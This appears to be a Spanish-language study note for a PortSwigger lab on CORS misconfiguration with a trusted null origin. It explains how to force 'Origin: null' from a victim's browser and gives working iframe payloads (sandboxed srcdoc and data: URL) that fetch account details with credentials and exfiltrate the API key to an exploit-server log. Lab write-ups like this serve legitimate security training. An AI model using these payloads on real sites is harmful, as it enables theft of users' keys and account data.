---
aliases:
  - CORS - bypass Origin null
  - bypass origin null
  - forzar Origin null
tags:
  - vuln/cors
  - example
  - portswigger
---

# Ejemplo — Bypass `Origin: null` (generar el origen nulo)

> Lab: [CORS vulnerability with trusted null origin](https://portswigger.net/web-security/cors/lab-null-origin-whitelisted-attack) · técnica → [[vulnerabilities/005-cors/cors|entry point]]

> [!warning] Repeater ≠ exploit
> En **Repeater** "forzás" `null` escribiendo a mano el header `Origin: null` — sirve solo para **confirmar** que el server lo confía.
> En un **exploit real** vos NO controlás el header `Origin`: lo pone el **navegador de la víctima** según desde dónde nace la request. Para que salga `Origin: null` hay que hacer que el `fetch` nazca de un **contexto sin origen** (sandbox / `data:` / `file:` / redirect). Estos son esos contextos.

**Qué demuestra:** cómo **generar** un origen `null` desde el navegador de la víctima para que la request a `/accountDetails` pase el chequeo de CORS (`Access-Control-Allow-Origin: null` + `Allow-Credentials: true`) y exfiltrar la API key.

---

## PoC principal — iframe *sandboxed* con `srcdoc` (la del lab)

Un iframe con `sandbox` **sin** `allow-same-origin` fuerza un origen opaco → `Origin: null`. El `<script>` va dentro del `srcdoc`.

```html
<!-- Subir al exploit server → Store → Deliver exploit to victim -->
<iframe sandbox="allow-scripts allow-top-navigation allow-forms" srcdoc="<script>
    fetch('https://TARGET.web-security-academy.net/accountDetails', { credentials: 'include' })
      .then(r => r.text())
      .then(d => location = 'https://EXPLOIT.exploit-server.net/log?key=' + encodeURIComponent(d));
</script>"></iframe>
```

> `allow-scripts` es imprescindible. **No** incluyas `allow-same-origin`: eso le daría un origen real y dejaría de ser `null`. `allow-top-navigation` habilita el `location=` final para exfiltrar.

---

## Variantes para generar `null` (mismo objetivo, otro contexto)

### a) `data:` URL — también produce origen `null`
```html
<iframe src="data:text/html,<script>
fetch('https://TARGET.web-security-academy.net/accountDetails', { credentials: 'include' })
  .then(r => r.text())
  .then(d => location = 'https://EXPLOIT.exploit-server.net/log?key=' + encodeURIComponent(d));
</script>"></iframe>
```

### b) `file:` / redirect cross-origin
- **`file:`** — abrir un `.html` local (`file:///C:/x.html`) da `Origin: null` (puede ir en base64). Poco práctico contra un bot víctima, pero es un contexto `null` válido.
- **Redirect cross-origin** — una request que atraviesa un `302` cross-site llega con `Origin: null` en algunos casos. Útil cuando no podés meter un iframe sandbox.

---

## Cómo verificar antes (Repeater)
Agregá a la request de datos:
```
Origin: null
```
Si la respuesta trae `Access-Control-Allow-Origin: null` + `Access-Control-Allow-Credentials: true` → recién ahí armás el iframe de arriba, **Deliver to victim** → **Access log**.
